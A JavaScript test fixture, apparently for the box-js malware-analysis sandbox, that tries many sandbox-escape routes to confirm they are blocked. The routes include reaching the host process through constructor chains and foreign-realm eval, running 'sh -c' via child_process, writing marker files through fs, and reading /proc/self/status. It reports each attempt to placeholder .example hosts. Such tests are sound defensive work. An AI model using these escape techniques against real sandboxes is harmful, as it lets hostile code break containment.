// Sandbox-escape probe used by test/sandbox-escape.js. __MARK__ is replaced with an absolute
// path outside the results dir. Every attempt logs http://attempted.example/<name> first, so
// the test can tell "blocked" from "never ran"; a working escape logs
// http://escaped.example/<name> and creates __MARK__.<name> through the host's real fs.
var MARK = "__MARK__";
function url(u) {
  try { var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", u, false); x.send(); } catch (e) {}
}
function hit(name) { url("http://escaped.example/" + name); }
function isProc(p) {
  try { return !!p && typeof p.pid === "number" && typeof p.exit === "function"; } catch (e) { return false; }
}
function useProc(name, p) {
  if (!isProc(p)) return;
  hit(name);
  try {
    var fsm = typeof p.getBuiltinModule === "function" ? p.getBuiltinModule("fs") : p.mainModule.require("fs");
    fsm.writeFileSync(MARK + "." + name, "x");
  } catch (e) {}
}
function useReq(name, r) {
  if (typeof r !== "function") return;
  var cp, fsm;
  try { cp = r("child_process"); } catch (e) {}
  try { if (cp && typeof cp.execFileSync === "function") { cp.execFileSync("sh", ["-c", ": > '" + MARK + "." + name + "-cp'"]); } } catch (e) {}
  try { fsm = r("fs"); } catch (e) {}
  try { if (fsm && typeof fsm.readFileSync === "function" && fsm.readFileSync("/proc/self/status")) { hit(name + "-fsread"); } } catch (e) {}
  try { if (fsm && typeof fsm.openSync === "function") { fsm.closeSync(fsm.openSync(MARK + "." + name + "-fs", "w")); hit(name + "-fs"); } } catch (e) {}
  // A member only the real module has (require_override.js hands out stubs for some ids).
  var real = {
    vm: "runInThisContext", module: "createRequire", worker_threads: "Worker", inspector: "Session",
    v8: "setFlagsFromString", net: "isIP", http: "globalAgent", https: "globalAgent",
    dgram: "createSocket", dns: "lookup", tls: "connect", zlib: "createInflate",
    child_process: "execFileSync", fs: "openSync", os: "setPriority",
  };
  Object.keys(real).forEach(function (m) {
    ["", "node:"].forEach(function (pre) {
      try { var mod = r(pre + m); if (mod && mod[real[m]] !== undefined) hit(name + "-" + pre + m); } catch (e) {}
    });
  });
  try { useProc(name + "-process", r("process")); } catch (e) {}
  try { var v = r("vm"); if (v && v.runInThisContext) useProc(name + "-vm", v.runInThisContext("process")); } catch (e) {}
  try { var c = r("crypto"); if (c && typeof c.setEngine === "function") hit(name + "-setEngine"); } catch (e) {}
}
function attempt(name, fn) {
  url("http://attempted.example/" + name);
  try { fn(); } catch (e) {}
}
var Q = "typeof process !== 'undefined' ? process : undefined";
function viaRealm(name, o) {
  // A foreign realm's global (a jsdom window) carries its own eval/Function.
  try { if (o && typeof o.eval === "function") useProc(name + "-eval", o.eval(Q)); } catch (e) {}
  try { if (o && typeof o.Function === "function") useProc(name + "-Function", o.Function("return " + Q)()); } catch (e) {}
  try { if (o && o.defaultView) viaRealm(name + "-defaultView", o.defaultView); } catch (e) {}
  try { if (o && o.ownerDocument && o.ownerDocument.defaultView) viaRealm(name + "-ownerDocument", o.ownerDocument.defaultView); } catch (e) {}
}
// A timer reached as some object's .constructor would get "return process" as a string
// handler, throw asynchronously and send box-js into its fallback re-run.
var TIMERS = [];
try { TIMERS = [setTimeout, setInterval, clearTimeout, clearInterval]; } catch (e) {}
function fromCtor(name, o) {
  try { if (TIMERS.indexOf(o) >= 0 || TIMERS.indexOf(o.constructor) >= 0) return; } catch (e) { return; }
  viaRealm(name, o);
  try { useProc(name, o.constructor.constructor("return process")()); } catch (e) {}
  try { useProc(name + "-own", o.constructor("return process")()); } catch (e) {}
  try { useProc(name + "-proto", Object.getPrototypeOf(o).constructor.constructor("return process")()); } catch (e) {}
}

